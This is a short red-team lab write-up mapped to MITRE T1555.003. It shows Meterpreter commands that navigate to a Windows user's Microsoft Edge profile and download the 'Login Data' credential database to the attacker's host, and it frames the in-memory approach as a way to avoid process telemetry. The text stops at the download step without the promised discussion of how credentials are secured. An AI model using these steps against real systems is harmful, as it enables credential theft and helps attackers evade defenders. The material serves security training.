T1555.003 - Browser Credential Storage Enumeration (In-Memory Exfiltration)
This lab segment simulates the silent extraction of sensitive web browser credential stores from local user profiles. 
The exercise contrasts high-visibility OS shell commands against stealthy, in-memory Meterpreter filesystem APIs, and highlights how modern operating systems secure credentials at rest.

Simulation Parameters
Attacker Host: Kali Linux (192.168.10.250)

Target Host: Windows 10 Workstation (192.168.10.9)

Target Profile: C:\Users\jcruz\ (Standard/Least Privilege User)

Target Data Store: Microsoft Edge SQLite Database (Login Data)

Sequence of Execution
Instead of dropping into a standard OS command prompt (cmd.exe), which generates high-severity process telemetry,
the data was staged and exfiltrated directly through Meterpreter's memory-resident virtual file system handlers.

1. Navigate to the Target User Space Storage
Change the payload working directory directly to the local application repository for Microsoft Edge using environment variables:

Code snippet
meterpreter > cd "%LocalAppData%\\Microsoft\\Edge\\User Data\\Default" 

directory enumeration 
meterpreter > ls

data Exfill 
meterpreter > download "Login Data" /tmp/edge_passwords.db
